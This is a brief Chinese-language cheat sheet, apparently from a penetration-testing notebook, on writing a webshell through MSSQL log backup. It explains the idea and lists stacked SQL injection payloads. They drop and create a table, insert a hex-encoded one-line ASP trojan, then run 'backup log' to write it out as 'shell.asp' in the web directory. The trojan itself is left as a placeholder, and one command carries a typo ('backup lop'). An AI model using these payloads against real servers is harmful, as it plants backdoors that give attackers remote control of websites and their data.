

## 差异备份

差异备份容易出错

## []()log备份一句话

无非就是将一句话木马写入到数据库当中，在通过log备份，把数据库的一句话木马备份成asp文件

## []()删除表

```
 ;drop table test_tmp
```

## []()创建表

```
 ;create table test_tmp(a image);
```

## []()备份整个数据库

```
 ;backup lop mydb to disk='网站目录\sqlsever.bak' with init;
```

## []()将一句话木马写到表里

```
;insert into test_tmp(a) values (asp一句话木马的16编码)
```

## []()将表中的内容备份到指定目录下指定文件

```
  ;backup log mydb to disk = '网站目标\shell.asp'
```

